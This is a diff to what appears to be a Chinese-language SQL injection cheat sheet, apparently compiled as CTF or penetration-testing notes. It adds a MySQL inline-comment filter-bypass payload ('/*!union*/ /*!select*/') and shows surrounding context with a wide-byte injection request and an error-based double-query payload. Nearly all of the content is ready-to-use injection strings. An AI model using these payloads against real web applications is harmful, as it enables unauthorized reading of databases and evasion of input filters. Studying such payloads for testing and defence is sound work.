@@ -7,6 +7,7 @@
 * 宽字节注入
 * 图片注入
 * Mysql 报错注入
+* Mysql 内联注释
 * 盲注
 * head注入
 * MD5绕过
@@ -144,6 +145,11 @@ GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20union%20sele
 * Error based Double Query Injection 
 ``` 
 ?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
+```
+
+## MySQL内联注释
+```shell
+?id= /*!union*/ /*!select*/ 1,2,3,5
 ```
 
 
